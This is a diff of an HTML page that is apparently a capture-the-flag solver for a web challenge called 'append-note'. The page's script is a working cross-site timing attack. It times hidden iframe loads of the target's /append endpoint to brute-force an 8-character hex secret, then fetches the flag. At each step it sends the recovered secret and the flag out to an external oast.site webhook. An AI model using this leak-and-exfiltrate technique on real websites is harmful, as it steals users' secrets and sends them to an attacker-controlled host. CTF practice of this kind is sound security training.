@@ -1,21 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>STARK ENT. - APPEND_NOTE_SOLVER</title>
+    <title>STARK ENT. - APPEND_NOTE_SOLVER v2</title>
     <style>
         body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
         .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
         .success { color: #3fb950; font-weight: bold; }
-        .delta { color: #d29922; }
+        .error { color: #f85149; }
     </style>
 </head>
 <body>
     <h2 id="status">INITIATING BRUTE FORCE...</h2>
     <div id="log"></div>
-
 <script>
-    const TARGET = "https://append-note-a2aq0.instancer.lac.tf";
-    const WEBHOOK = "https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site";
+    const TARGET = "https://append-note-61jaz.instancer.lac.tf";
+    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu88dorcsdwsq0ju.oast.site";
     const CHARS = "0123456789abcdef";
     
     const log = (msg, cls="") => {
@@ -24,70 +23,116 @@
         div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
         document.getElementById("log").prepend(div);
     };
-
-    const report = (data) => fetch(`${WEBHOOK}?data=${encodeURIComponent(JSON.stringify(data))}`, {mode:'no-cors'});
-
+    
+    const report = (data) => {
+        fetch(`${WEBHOOK}?${encodeURIComponent(JSON.stringify(data))}`, {mode:'no-cors'});
+    };
+    
+    // Better timing oracle using iframe load events
     async function probe(content) {
-        const t0 = performance.now();
-        // Use a unique name for each window to prevent state collisions
-        const w = window.open(`${TARGET}/append?content=${content}&url=${window.location.href}`, `w_${Math.random()}`);
-        
-        return new Promise(r => {
-            // We wait for a fixed window. If it redirects back to us, it's faster.
-            setTimeout(() => {
+        return new Promise((resolve) => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            const t0 = performance.now();
+            
+            const cleanup = () => {
+                document.body.removeChild(iframe);
+            };
+            
+            // Set timeout in case load never fires
+            const timeout = setTimeout(() => {
                 const elapsed = performance.now() - t0;
-                if(w) w.close();
-                r(elapsed);
-            }, 450); // Tuned for remote latency
+                cleanup();
+                resolve(elapsed);
+            }, 1000);
+            
+            iframe.onload = () => {
+                clearTimeout(timeout);
+                const elapsed = performance.now() - t0;
+                cleanup();
+                resolve(elapsed);
+            };
+            
+            document.body.appendChild(iframe);
+            iframe.src = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
         });
     }
-
+    
     async function solve() {
         let secret = "";
-        log("Calibrating Baseline...", "delta");
-        const baseline = await probe("NOT_REAL_" + Math.random());
-        log(`Baseline Latency: ${baseline.toFixed(2)}ms`);
-
-        for (let i = 0; i < 8; i++) {
-            let winner = "";
-            let minTime = 9999;
-            log(`CRACKING POSITION ${i+1}...`);
-
-            for (const c of CHARS) {
-                const attempt = secret + c;
-                const time = await probe(attempt);
-                const delta = time - baseline;
-
-                log(`Try ${c}: ${time.toFixed(1)}ms (Delta: ${delta.toFixed(1)}ms)`);
-
-                // In Python's any(), the TRUE case is the fastest (Short-circuit)
-                if (time < minTime) {
-                    minTime = time;
-                    winner = c;
-                }
-                
-                // If we see a massive speedup (e.g., >50ms difference), we likely found it.
-                if (delta < -40) {
-                    log(`High Signal Detected for ${c}!`, "success");
-                    break; 
-                }
-            }
-
-            secret += winner;
-            log(`LOCKED IN: ${secret}`, "success");
-            report({pos: i, char: winner, current: secret, time: minTime});
-            
-            // Short sleep to let the browser breathe before next round
+        
+        // Calibrate with multiple baseline measurements
+        log("Calibrating baseline (5 samples)...");
+        let baselineTimes = [];
+        for (let i = 0; i < 5; i++) {
+            const t = await probe("INVALID_" + Math.random());
+            baselineTimes.push(t);
             await new Promise(r => setTimeout(r, 100));
         }
-
-        log(`FINAL SECRET: ${secret}`, "success");
-        const flagRes = await fetch(`${TARGET}/flag?secret=${secret}`);
-        const flag = await flagRes.text();
-        report({FLAG: flag});
-        document.getElementById("status").textContent = "FLAG CAPTURED: " + flag;
+        const baseline = baselineTimes.reduce((a,b) => a+b) / baselineTimes.length;
+        log(`Baseline: ${baseline.toFixed(2)}ms (avg of ${baselineTimes.map(t => t.toFixed(0)).join(', ')})`);
+        
+        for (let pos = 0; pos < 8; pos++) {
+            log(`\n=== POSITION ${pos + 1}/8 ===`);
+            
+            let results = [];
+            
+            // Test each character multiple times for reliability
+            for (const c of CHARS) {
+                const attempt = secret + c;
+                let times = [];
+                
+                // Take 3 samples per character
+                for (let sample = 0; sample < 3; sample++) {
+                    const time = await probe(attempt);
+                    times.push(time);
+                    await new Promise(r => setTimeout(r, 80));
+                }
+                
+                const avgTime = times.reduce((a,b) => a+b) / times.length;
+                const delta = baseline - avgTime; // Positive delta = faster = likely match
+                
+                results.push({ char: c, avgTime, delta, times });
+                log(`${c}: ${avgTime.toFixed(1)}ms (Δ ${delta > 0 ? '+' : ''}${delta.toFixed(1)}ms) [${times.map(t => t.toFixed(0)).join(',')}]`);
+            }
+            
+            // Pick the character with the largest positive delta (fastest response)
+            results.sort((a, b) => b.delta - a.delta);
+            const winner = results[0];
+            
+            secret += winner.char;
+            log(`✓ LOCKED: ${secret} (chose '${winner.char}' with Δ +${winner.delta.toFixed(1)}ms)`, "success");
+            
+            report({
+                position: pos,
+                char: winner.char,
+                secret: secret,
+                delta: winner.delta,
+                top3: results.slice(0, 3).map(r => ({c: r.char, d: r.delta.toFixed(1)}))
+            });
+        }
+        
+        log(`\n=== ATTEMPTING FLAG RETRIEVAL ===`);
+        log(`Secret: ${secret}`, "success");
+        
+        try {
+            const flagRes = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
+            const flag = await flagRes.text();
+            
+            if (flag.startsWith('lactf{')) {
+                log(`\n🚩 FLAG: ${flag}`, "success");
+                document.getElementById("status").textContent = `✓ ${flag}`;
+                report({FINAL_SECRET: secret, FLAG: flag, SUCCESS: true});
+            } else {
+                log(`❌ Invalid secret. Response: ${flag}`, "error");
+                report({FINAL_SECRET: secret, RESPONSE: flag, SUCCESS: false});
+            }
+        } catch (e) {
+            log(`❌ Error fetching flag: ${e}`, "error");
+            report({FINAL_SECRET: secret, ERROR: e.toString()});
+        }
     }
-
+    
     window.onload = solve;
 </script>
 </body>
